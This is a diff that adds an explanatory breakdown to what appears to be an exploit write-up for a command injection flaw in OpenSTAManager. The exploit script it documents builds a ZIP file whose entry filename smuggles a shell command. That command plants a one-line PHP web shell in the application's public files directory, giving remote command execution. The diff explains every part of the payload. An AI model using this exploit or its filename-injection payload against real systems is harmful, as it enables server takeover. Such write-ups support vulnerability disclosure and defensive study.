@@ -883,6 +883,36 @@ malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'
 with zipfile.ZipFile('exploit.zip', 'w') as zf:
     zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
 ```
+
+**Breakdown:**
+
+**`import zipfile`**  
+Imports Python's built-in ZIP file library. This is what allows us to create and write ZIP archives directly from Python without needing any external tools.
+
+**`cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'`**  
+This is the actual command we want the server to execute. Breaking it down further:
+
+- `cd files` — moves into OpenSTAManager's publicly accessible `files/` directory, which is reachable via the web server
+- `&&` — only runs the next command if the first one succeeded
+- `echo '<?php system($_GET["c"]); ?>' > SHELL.php` — writes a minimal one-line PHP web shell into that directory. The shell accepts a command via the `c` GET parameter and executes it on the server using PHP's `system()` function
+
+**`malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'`**  
+This is the heart of the exploit — the injected filename. When OpenSTAManager receives this filename and passes it unsanitised to a system command, the following happens:
+
+- `invoice.p7m"` — closes the expected filename string with a `"`
+- `;` — ends the original command
+- `{cmd}` — injects our shell command
+- `;echo "` — chains another command to cleanly re-open the string
+- `.p7m` — closes the string back to something that looks like a normal `.p7m` extension, preventing an immediate crash
+
+**`with zipfile.ZipFile('exploit.zip', 'w') as zf:`**  
+Creates a new ZIP file called `exploit.zip` in write mode. The `with` block ensures the file is properly closed and finalised once writing is complete.
+
+**`zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")`**  
+Writes an entry into the ZIP archive using our malicious string as the filename. The actual file content (`DUMMY_P7M_CONTENT`) is irrelevant — it's just a placeholder to make the ZIP valid. The application will error when trying to parse it as XML, but the command injection in the filename fires before that error occurs.
+
+**`print("[+] exploit.zip created")`**  
+Confirms the script ran successfully and the ZIP file is ready to upload.
 <div align="center">
 <br>
 <br>
